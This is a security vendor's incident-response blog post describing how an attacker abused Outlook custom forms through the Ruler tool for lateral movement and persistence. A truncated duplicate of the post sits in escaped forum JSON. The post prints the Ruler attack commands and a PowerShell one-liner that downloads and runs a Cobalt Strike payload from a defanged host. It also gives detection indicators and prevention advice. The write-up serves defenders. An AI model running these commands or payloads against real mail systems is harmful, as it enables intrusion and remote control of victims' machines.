          <p><em>By CrowdStrike Services: Tim Parisi, Doug Clendening and Jai Musunuri</em></p>
<h2>Background</h2>
<p>During a recent CrowdStrike Services investigation, we identified an adversary attack method, used for lateral movement and persistence, that we have not seen used before. The attack leveraged customized forms – not macros – in Microsoft Outlook that allowed Visual Basic code to execute on a system just by opening or previewing an email message.</p>
<p>A detailed explanation of the Outlook forms attack can be found in the SensePost article <a href="https://sensepost.com/blog/2017/outlook-forms-and-shells/" target="_blank">here</a>. This article below details CrowdStrike’s observations responding to an adversary that used this attack, including a high-level walk-through of the adversary’s actions, along with our detection and prevention methods.</p>
<h2>Walk-through</h2>
<p>Shortly after responding to our client’s call, we performed forensic analysis and identified that the adversary had accessed the client’s single-factor authentication Outlook Web Access (OWA) server using previously harvested credentials. With access to the victim’s OWA server, the adversary created custom message forms to a set of users in the victim organization’s environment. The custom forms, when triggered through an email, allowed the adversary to execute code on the victim system.</p>
<p>To create custom forms, the adversary used the <a href="https://github.com/sensepost/ruler" target="_blank">Ruler</a> utility. In this case, the adversary created a custom Outlook form that enabled Visual Basic code execution and embedded the Cobalt Strike downloader to the email message. This allowed shell access and full read, write, and execute permissions on the system each time an email was sent to the user using the custom malicious form.</p>
<p>Below is a sample command using Ruler to create a custom form, specifying the file “/test/CobaltStrike.txt”, which contained Visual Basic code to download and launch Cobalt Strike, and then sending an email to trigger the form:<br>
./ruler –email user@victim.com form add –suffix MaliciousForm –input /test/CobaltStrike.txt –send<br>
<em>Figure 1: Sample Ruler command to create the form “MaliciousForm” and send an email to the victim</em></p>
<ol>
<li>The above command performed the following actions:<br>
Created the custom form “MaliciousForm” in the “user@victim.com” mailbox</li>
<li>Sent an email to “user@victim.com” from the same sender “user@victim.com”<br>
a. The email contained the default Ruler subject of “Invoice [Confidential]”</li>
<li>Cobalt Strike was downloaded and executed on the victim system, granting shell access to the adversary</li>
</ol>
<p>The payload embedded in the adversary email contained the following code, which downloaded and executed a Cobalt Strike payload:<br>
CreateObject(“WScript.Shell”).Run “cmd /c powershell.exe -NoP -sta -w hidden -c IEX ((new-object net.webclient).downloadstring(‘hxxp://:80/updater’))”<br>
<em>Figure 2: Email payload that is executed on victim system with custom form</em></p>
<p>The adversary employed this attack as a novel approach to move laterally within the environment without using traditional RDP or network logons, and bypassing the jump box that was in place between network segments in the victim organization. The adversary also leveraged this attack to maintain persistence in the environment by simply sending emails to any mailboxes that had the malicious custom form previously created through the following sample command:<br>
./ruler –email user@victim.com form send –suffix MaliciousForm<br>
<em>Figure 3: Sample Ruler command to send email with a payload to a victim that already has a custom form created in their mailbox</em></p>
<p>So how can organizations detect and protect themselves from this?</p>
<h2>Detection</h2>
<p>One way to detect this activity is to monitor OWA IIS logs for the Ruler user agent string, which is “ruler.” A sample OWA IIS log below shows the adversary accessing the victim’s OWA server with the Ruler utility:<br>
cs-method=POST cs-uri-stem=/autodiscover/autodiscover.xml cs-uri-query=- s-port=444 cs-username=DOMAIN\account c-ip=192.168.1.1 cs-version=HTTP/1.1 cs(User-Agent)=ruler cs(Referer)=- sc-status=200 sc-substatus=0 sc-win32-status=0 time-taken=31<br>
<em>Figure 4: Sample OWA IIS log showing the Ruler user agent “ruler” being used by the adversary</em></p>
<p>Another detection method involves the Windows registry. Custom forms can be identified by searching the registry for the following keys that contain values other than “IPM.Note.” In the example below, the Custom Form Compose, Read and Preview keys are populated with the “IPM.Note.MaliciousForm” values:<br>
Key: [HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\<strong>Custom Forms\Compose</strong>]
Name: IPM.Note<br>
Type: String<br>
Value: IPM.Note.MaliciousForm<br>
Key: [HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\<strong>Custom Forms\Read</strong>]
Name: IPM.Note<br>
Type: String<br>
Value: IPM.Note.MaliciousForm<br>
Key: [HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\<strong>Custom Forms\Preview</strong>]
Name: IPM.Note<br>
Type: String<br>
Value: IPM.Note.MaliciousForm<br>
<em><br>
Figure 5: Registry keys and values that show a custom form is being used on the system when composing, reading or previewing an email</em></p>
<p>Lastly, if the adversary does not change the default Ruler subject, SMTP traffic that contains the default subject of “Invoice [Confidential]” should be reviewed. In addition, monitoring utilities should have rules configured that alert on emails that contain the default Ruler subject of “Invoice [Confidential]”.</p>
<h2>Prevention</h2>
<p>To perform this attack, the adversary needed to gain access to the Microsoft Exchange server, which in this case, only required single-factor authentication. Organizations should ensure that all aspects of their user base – whether corporate or third-party – are using two-factor authentication for email access.</p>
<p>In addition, organizations should implement an advanced endpoint protection platform, such as CrowdStrike Falcon®, that leverages machine learning to identify anomalies and perform heuristics, in addition to detecting and preventing known and unknown threats in real time. An endpoint agent such as CrowdStrike Falcon would have prevented the Cobalt Strike payload from successfully executing on the system, and prevented the adversary from moving laterally throughout the victim environment.</p>
<p>Learn more about detecting and preventing threats in real time by visiting our <a href="https://www.crowdstrike.com/products/" target="_blank">CrowdStrike Falcon platform</a> page, or <a href="https://www.crowdstrike.com/services/incident-response/" target="_blank">visit this page</a> for details on CrowdStrike’s pre- and post-incident response services.</p>
<p>The post <a href="https://www.crowdstrike.com/blog/using-outlook-forms-lateral-movement-persistence/" target="_blank">Using Outlook Forms for Lateral Movement and Persistence</a> appeared first on <a href="https://www.crowdstrike.com/blog" target="_blank"></a>.</p>
<p>Article Link: <a href="https://www.crowdstrike.com/blog/using-outlook-forms-lateral-movement-persistence/">https://www.crowdstrike.com/blog/using-outlook-forms-lateral-movement-persistence/</a></p>

ite_logo_small_url\&quot;:\&quot;https://malware.news/uploads/default/original/3X/a/0/a0086c91da850eb004fb4af82117ab347b9e272a.png\&quot;,\&quot;site_mobile_logo_url\&quot;:\&quot;https://malware.news/uploads/default/original/3X/b/a/ba8ee0a927a69022c651441ac23d01bcdbc09785.png\&quot;,\&quot;site_favicon_url\&quot;:\&quot;https://malware.news/uploads/default/optimized/3X/a/0/a0086c91da850eb004fb4af82117ab347b9e272a_2_32x32.png\&quot;,\&quot;site_logo_dark_url\&quot;:\&quot;\&quot;,\&quot;site_logo_small_dark_url\&quot;:\&quot;\&quot;,\&quot;site_mobile_logo_dark_url\&quot;:\&quot;\&quot;}&quot;,&quot;customHTML&quot;:&quot;{\&quot;top\&quot;:\&quot;\&quot;,\&quot;footer\&quot;:\&quot;\&quot;}&quot;,&quot;banner&quot;:&quot;{}&quot;,&quot;customEmoji&quot;:&quot;[]&quot;,&quot;isReadOnly&quot;:&quot;false&quot;,&quot;activatedThemes&quot;:&quot;{\&quot;2\&quot;:\&quot;Default\&quot;}&quot;,&quot;topic_13746&quot;:&quot;{\&quot;post_stream\&quot;:{\&quot;posts\&quot;:[{\&quot;id\&quot;:11820,\&quot;username\&quot;:\&quot;MalBot\&quot;,\&quot;avatar_template\&quot;:\&quot;/user_avatar/malware.news/malbot/{size}/24_2.png\&quot;,\&quot;created_at\&quot;:\&quot;2017-07-22T00:45:04.109Z\&quot;,\&quot;cooked\&quot;:\&quot;\\u003cp\\u003e\\u003cem\\u003eBy CrowdStrike Services: Tim Parisi, Doug Clendening and Jai Musunuri\\u003c/em\\u003e\\u003c/p\\u003e\\n\\u003ch2\\u003eBackground\\u003c/h2\\u003e\\n\\u003cp\\u003eDuring a recent CrowdStrike Services investigation, we identified an adversary attack method, used for lateral movement and persistence, that we have not seen used before. The attack leveraged customized forms – not macros – in Microsoft Outlook that allowed Visual Basic code to execute on a system just by opening or previewing an email message.\\u003c/p\\u003e\\n\\u003cp\\u003eA detailed explanation of the Outlook forms attack can be found in the SensePost article \\u003ca href=\\\&quot;https://sensepost.com/blog/2017/outlook-forms-and-shells/\\\&quot; target=\\\&quot;_blank\\\&quot;\\u003ehere\\u003c/a\\u003e. This article below details CrowdStrike’s observations responding to an adversary that used this attack, including a high-level walk-through of the adversary’s actions, along with our detection and prevention methods.\\u003c/p\\u003e\\n\\u003ch2\\u003eWalk-through\\u003c/h2\\u003e\\n\\u003cp\\u003eShortly after responding to our client’s call, we performed forensic analysis and identified that the adversary had accessed the client’s single-factor authentication Outlook Web Access (OWA) server using previously harvested credentials. With access to the victim’s OWA server, the adversary created custom message forms to a set of users in the victim organization’s environment. The custom forms, when triggered through an email, allowed the adversary to execute code on the victim system.\\u003c/p\\u003e\\n\\u003cp\\u003eTo create custom forms, the adversary used the \\u003ca href=\\\&quot;https://github.com/sensepost/ruler\\\&quot; target=\\\&quot;_blank\\\&quot;\\u003eRuler\\u003c/a\\u003e utility. In this case, the adversary created a custom Outlook form that enabled Visual Basic code execution and embedded the Cobalt Strike downloader to the email message. This allowed shell access and full read, write, and execute permissions on the system each time an email was sent to the user using the custom malicious form.\\u003c/p\\u003e\\n\\u003cp\\u003eBelow is a sample command using Ruler to create a custom form, specifying the file “/test/CobaltStrike.txt”, which contained Visual Basic code to download and launch Cobalt Strike, and then sending an email to trigger the form:\\u003cbr\\u003e\\n./ruler –email user@victim.com form add –suffix MaliciousForm –input /test/CobaltStrike.txt –send\\u003cbr\\u003e\\n\\u003cem\\u003eFigure 1: Sample Ruler command to create the form “MaliciousForm” and send an email to the victim\\u003c/em\\u003e\\u003c/p\\u003e\\n\\u003col\\u003e\\n\\u003cli\\u003eThe above command performed the following actions:\\u003cbr\\u003e\\nCreated the custom form “MaliciousForm” in the “user@victim.com” mailbox\\u003c/li\\u003e\\n\\u003cli\\u003eSent an email to “user@victim.com” from the same sender “user@victim.com”\\u003cbr\\u003e\\na. The email contained the default Ruler subject of “Invoice [Confidential]”\\u003c/li\\u003e\\n\\u003cli\\u003eCobalt Strike was downloaded and executed on the victim system, granting shell access to the adversary\\u003c/li\\u003e\\n\\u003c/ol\\u003e\\n\\u003cp\\u003eThe payload embedded in the adversary email contained the following code, which downloaded and executed a Cobalt Strike payload:\\u003cbr\\u003e\\nCreateObject(“WScript.Shell”).Run “cmd /c powershell.exe -NoP -sta -w hidden -c IEX ((new-object net.webclient).downloadstring(‘hxxp://:80/updater’))”\\u003cbr\\u003e\\n\\u003cem\\u003eFigure 2: Email payload that is executed on victim system with custom form\\u003c/em\\u003e\\u003c/p\\u003e\\n\\u003cp\\u003eThe adversary employed this attack as a novel approach to move laterally within the environment without using traditional RDP or network logons, and bypassing the jump box that was in place between network segments in the victim organization. The adversary also leveraged this attack to maintain persistence in the environment by simply sending emails to any mailboxes that had the malicious custom form previously created through the following sample command:\\u003cbr\\u003e\\n./ruler –email user@victim.com form send –suffix MaliciousForm\\u003cbr\\u003e\\n\\u003cem\\u003eFigure 3: Sample Ruler command to send email with a payload to a victim that already has a custom form created in their mailbox\\u003c/em\\u003e\\u003c/p\\u003e\\n\\u003cp\\u003eSo how can organizations detect and protect themselves from this?\\u003c/p\\u003e\\n\\u003ch2\\u003eDetection\\u003c/h2\\u003e\\n\\u003cp\\u003eOne way to detect this activity is to monitor OWA IIS logs for the Ruler user agent string, which is “ruler.” A sample OWA IIS log below shows the adversary accessing the victim’s OWA server with the Ruler utility:\\u003cbr\\u003e\\ncs-method=POST cs-uri-stem=/autodiscover/autodiscover.xml cs-uri-query=- s-port=444 cs-username=DOMAIN\\\\account c-ip=192.168.1.1 cs-version=HTTP/1.1 cs(User-Agent)=ruler cs(Referer)=- sc-status=200 sc-substatus=0 sc-win32-status=0 time-taken=31\\u003cbr\\u003e\\n\\u003cem\\u003eFigure 4: Sample OWA IIS log showing the Ruler user agent “ruler” being used by the adversary\\u003c/em\\u003e\\u003c/p\\u003e\\n\\u003cp\\u003eAnother detection method involves the Windows registry. Custom forms can be identified by searching the registry for the following keys that contain values other than “IPM.Note.” In the example below, the Custom Form Compose, Read and Preview keys are populated with the “IPM.Note.MaliciousForm” values:\\u003cbr\\u003e\\nKey: [HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office\\\\16.0\\\\Outlook\\\\\\u003cstrong\\u003eCustom Forms\\\\Compose\\u003c/strong\\u003e]\\nName: IPM.Note\\u003cbr\\u003e\\nType: String\\u003cbr\\u003e\\nValue: IPM.Note.MaliciousForm\\u003cbr\\u003e\\nKey: [HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office\\\\16.0\\\\Outlook\\\\\\u003cstrong\\u003eCustom Forms\\\\Read\\u003c/strong\\u003e]\\nName: IPM.Note\\u003cbr\\u003e\\nType: String\\u003cbr\\u003e\\nValue: IPM.Note.MaliciousForm\\u003cbr\\u003e\\nKey: [HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Office\\\\16.0\\\\Outlook\\\\\\u003cstrong\\u003eCustom Forms\\\\Preview\\u003c/strong\\u003e]\\nName: IPM.Note\\u003cbr\\u003e\\nType: String\\u003cbr\\u003e\\nValue: IPM.Note.MaliciousForm\\u003cbr\\u003e\\n\\u003cem\\u003e\\u003cbr\\u003e\\nFigure 5: Registry keys and values that show a custom form is being used on the system when composing, reading or previewing an email\\u003c/em\\u003e\\u003c/p\\u003e\\n\\u003cp\\u003eLastly, if the adversary does not change the default Ruler subject, SMTP traffic that contains the default subject of “Invoice [Confidential]” should be reviewed. In addition, monitoring utilities should have rules configured that alert on emails that contain the default Ruler subject of “Invoice [Confidential]”.\\u003c/p\\u003e\\n\\u003ch2\\u003ePrevention\\u003c/h2\\u003e\\n\\u003cp\\u003eTo perform this attack, the adversary needed to gain access to the Microsoft Exchange server, which in this case, only required single-factor authentication. Organizations should ensure that all aspects of their user base – whether corporate or third-party – are using two-factor authentication for email access.\\u003c/p\\u003e\\n\\u003cp\\u003eIn addition, organizations should implement an advanced endpoint protection platform, such as CrowdStrike Falcon®, that leverages machine learning to identify anomalies and perform heuristics, in addition to detecting and preventing known and unknown threats in real time. An endpoint agent such as CrowdStrike Falcon would have prevented the Cobalt Strike payload from successfully executing on the system, and prevented the adversary from moving laterally throughout the victim environment.\\u003c/p\\u003e\\n\\u003cp\\u003eLearn more about detecting and preventing threats in real time by visiting our \\u003ca href=\\\&quot;https://www.crowdstrike.com/products/\\\&quot; target=\\\&quot;_blank\\\&quot;\\u003eCrowdStrike Falcon platform\\u003c/a\\u003e page, or \\u003ca href=\\\&quot;https://www.crowdstrike.com/services/incident-response/\\\&quot; target=\\\&quot;_blank\\\&quot;\\u003evisit this page\\u003c/a\\u003e for details on CrowdStrike’s pre- and post-incident response services.\\u003c/p\\u003e\\n\\u003cp\\u003eThe post \\u003ca href=\\\&quot;https://www.crowdstrike.com/blog/using-outlook-forms-lateral-movement-persistence/\\\&quot; target=\\\&quot;_blank\\\&quot;\\u003eUsing Outlook Forms for Lateral Movement and Persistence\\u003c/a\\u003e appeared first on \\u003ca href=\\\&quot;https://www.crowdstrike.com/blog\\\&quot; target=\\\&quot;_blank\\\&quot;\\u003e\\u003c/a\\u003e.\\u003c/p\\u003e\\n\\u003cp\\
